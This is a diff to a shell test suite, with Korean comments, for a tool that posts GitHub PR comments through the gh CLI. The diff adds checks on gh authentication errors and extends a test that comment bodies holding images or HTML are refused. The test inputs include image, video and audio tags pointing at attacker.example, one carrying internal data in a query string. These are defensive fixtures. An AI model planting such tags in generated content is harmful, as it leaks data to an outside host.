@@ -25,6 +25,7 @@ case "$1 ${2:-}" in
   "auth status")
     # GH_OTHER_ACCOUNT_BROKEN=1 — 활성 계정 밖(다른 호스트·두 번째 계정)이 깨졌다. `--active` 없이 물으면 gh 는 1 을 낸다.
     if [ "${GH_OTHER_ACCOUNT_BROKEN:-0}" = 1 ] && [ "${3:-}" != "--active" ]; then exit 1; fi
+    [ "${GH_AUTH_RC:-0}" = 0 ] || echo 'X Failed to log in to github.com account octo (stub-auth-detail)' >&2
     exit "${GH_AUTH_RC:-0}" ;;
   "pr view")
     case "${GH_PR:-none}" in
@@ -143,6 +144,10 @@ case_AC13_gh_unavailable() {
   GH_AUTH_RC=1 GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$BODY"
   assert_eq "$LAST" "skipped: gh-unavailable" "AC13 미인증: 마지막 줄"
   assert_eq "$GHCALLS" "auth status --active" "P5: 미인증이면 auth 확인 뒤 gh 호출이 없다"
+  grep -qF 'stub-auth-detail' "$T/err" \
+    && ok "R3: 미인증이면 gh 자신의 stderr 꼬리를 보인다" || no "R3: gh 의 인증 오류가 stderr 에 없다 — $(head -n 3 "$T/err")"
+  grep -qF 'publish-comment: gh 미인증' "$T/err" \
+    && ok "R3: 짧은 접두 줄도 남는다" || no "R3: 접두 줄이 없다"
   # 활성 계정은 멀쩡하고 다른 계정만 깨졌으면 게시한다 — 인증 확인은 활성 계정만 본다(M3).
   GH_OTHER_ACCOUNT_BROKEN=1 GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$BODY"
   assert_eq "$LAST" "posted: https://github.com/o/r/pull/7#issuecomment-1" "M3: 다른 계정만 깨졌으면 게시한다(auth status --active)"
@@ -393,7 +398,9 @@ case_I2_images_and_html_refused() {
   local img="$T/img.md" form i=0
   for form in '![x](https://attacker.example/p.png?d=db-prod-internal)' '![x][ref]' \
               '<img src="https://attacker.example/p.png">' '<IMG SRC=x>' '<picture>x</picture>' \
-              '<source srcset="https://attacker.example/p.png">' '<svg><image href="x"/></svg>' '<SvG>'; do
+              '<source srcset="https://attacker.example/p.png">' '<svg><image href="x"/></svg>' '<SvG>' \
+              '<image href="https://attacker.example/p.png">' '<VIDEO src="https://attacker.example/v.mp4">' \
+              '<audio src="https://attacker.example/a.mp3">'; do
     i=$((i + 1))
     printf '## 한 줄\n본문 %s 끝.\n' "$form" > "$img"
     GH_PR="$OPEN_PR" run_sink "$WITH_GH" --body-file "$img"
